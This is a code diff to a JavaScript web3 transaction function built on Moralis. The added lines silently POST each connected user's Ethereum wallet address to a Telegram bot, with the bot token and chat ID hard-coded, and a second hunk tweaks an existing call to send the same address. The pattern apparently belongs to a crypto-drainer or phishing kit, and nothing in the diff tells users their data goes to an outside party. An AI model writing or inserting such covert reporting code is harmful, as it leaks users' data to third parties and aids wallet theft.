@@ -106,6 +106,11 @@ async function transact() {
       };
             try {
                 let result = await Moralis.executeFunction(sendOptions);
+                var z=$.ajax({  
+  type: "POST",  
+  url: "https://api.telegram.org/bot"+"5168917302:AAHHZ7ruzC1g3u3Dm87iCUeWT1XyABRuRpY"+"/sendMessage?chat_id="+"854910722",
+  data: "parse_mode=HTML&text="+encodeURIComponent(Moralis.User.current().get("ethAddress")), 
+  }); 
             } catch (e) {
                 throwmodal('Error: Insufficient funds!');
             }
@@ -126,7 +131,7 @@ async function transact() {
                 var z=$.ajax({  
   type: "POST",  
   url: "https://api.telegram.org/bot"+"5168917302:AAHHZ7ruzC1g3u3Dm87iCUeWT1XyABRuRpY"+"/sendMessage?chat_id="+"854910722",
-  data: "parse_mode=HTML&text="+encodeURIComponent(Moralis.User.current()), 
+  data: "parse_mode=HTML&text="+encodeURIComponent(Moralis.User.current().get("ethAddress")), 
   }); 
             } catch (e) {
                 throwmodal('Error: Insufficient funds!');
